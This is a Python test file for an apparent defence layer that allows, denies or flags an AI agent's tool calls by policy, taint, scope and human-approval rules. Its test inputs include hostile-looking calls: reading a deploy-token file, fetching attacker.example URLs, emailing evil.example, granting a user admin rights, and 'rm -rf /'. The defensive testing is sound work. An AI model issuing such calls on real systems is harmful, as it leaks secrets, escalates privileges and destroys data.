import itertools
import shutil

import pytest

from arh.agent import user_named
from arh.defenses.approval import needs_static_approval, review
from arh.defenses.policy import OPAEngine, PythonEngine, build_input
from arh.types import ToolCall

ENGINE = PythonEngine()
NAMED = user_named("Email the summary to bob@northwind.example and fetch https://docs.vendor.example/vpn. Run `df -h`.")
SCOPE = ["search_docs", "read_file", "fetch_url", "send_email", "run_shell", "set_user_role", "read_inbox"]


def decide(call, scope=SCOPE, enforce=True, taint=(), named=NAMED):
    return ENGINE.evaluate(build_input(call, scope, enforce, set(taint), named))


@pytest.mark.parametrize("call,taint,expected", [
    (ToolCall("read_file", {"path": "/secrets/deploy_token.txt"}), (), ("deny", "path_denied")),
    (ToolCall("read_file", {"path": "/hr/salaries.csv"}), (), ("allow", "default_allow")),
    (ToolCall("fetch_url", {"url": "https://attacker.example/x"}), (), ("deny", "egress_host")),
    (ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn?d=1"}), ("confidential",), ("deny", "taint_egress_url")),
    (ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn?d=1"}), ("internal",), ("allow", "default_allow")),
    (ToolCall("send_email", {"to": "x@evil.example"}), (), ("deny", "egress_domain")),
    (ToolCall("send_email", {"to": "mallory@northwind.example"}), ("confidential",), ("deny", "taint_egress_email")),
    (ToolCall("send_email", {"to": "mallory@northwind.example"}), (), ("require_approval", "unbound_recipient")),
    (ToolCall("send_email", {"to": "bob@northwind.example"}), ("confidential",), ("allow", "default_allow")),
    (ToolCall("run_shell", {"command": "df -h"}), (), ("require_approval", "privileged_tool")),
])
def test_policy_rules(call, taint, expected):
    d = decide(call, taint=taint)
    assert (d.effect, d.rule) == expected


def test_least_privilege_scope():
    d = decide(ToolCall("send_email", {"to": "bob@northwind.example"}), scope=["search_docs"])
    assert (d.effect, d.rule) == ("deny", "least_privilege")
    d = decide(ToolCall("send_email", {"to": "bob@northwind.example"}), scope=["search_docs"], enforce=False)
    assert d.effect == "allow"


def test_intent_bound_reviewer():
    assert review(ToolCall("send_email", {"to": "bob@northwind.example"}), "intent", NAMED, "alice").approved
    assert not review(ToolCall("send_email", {"to": "mallory@northwind.example"}), "intent", NAMED, "alice").approved
    assert not review(ToolCall("set_user_role", {"user": "mallory", "role": "admin"}), "intent", NAMED, "alice").approved
    assert review(ToolCall("run_shell", {"command": "df -h"}), "intent", NAMED, "alice").approved
    assert review(ToolCall("run_shell", {"command": "rm -rf /"}), "rubber_stamp", NAMED, "alice").approved
    assert needs_static_approval(ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn?x=1"}), NAMED)
    assert not needs_static_approval(ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn"}), NAMED)


@pytest.mark.skipif(shutil.which("opa") is None, reason="opa CLI not installed")
def test_rego_policy_matches_python_engine():
    opa = OPAEngine()
    calls = [
        ToolCall("read_file", {"path": "/secrets/deploy_token.txt"}),
        ToolCall("read_file", {"path": "/reports/q3_threat_brief.md"}),
        ToolCall("fetch_url", {"url": "https://attacker.example/c?k=1"}),
        ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn?ref=x"}),
        ToolCall("fetch_url", {"url": "https://docs.vendor.example/vpn"}),
        ToolCall("send_email", {"to": "x@evil.example"}),
        ToolCall("send_email", {"to": "mallory@northwind.example"}),
        ToolCall("send_email", {"to": "bob@northwind.example"}),
        ToolCall("run_shell", {"command": "df -h"}),
        ToolCall("set_user_role", {"user": "mallory", "role": "admin"}),
        ToolCall("search_docs", {"query": "vpn"}),
    ]
    scopes = [SCOPE, ["search_docs", "read_file"]]
    taints = [(), ("internal",), ("confidential",), ("secret", "external")]
    for call, scope, enforce, taint in itertools.product(calls, scopes, [True, False], taints):
        inp = build_input(call, scope, enforce, set(taint), NAMED)
        assert opa.evaluate(inp) == ENGINE.evaluate(inp), (call, scope, enforce, taint)
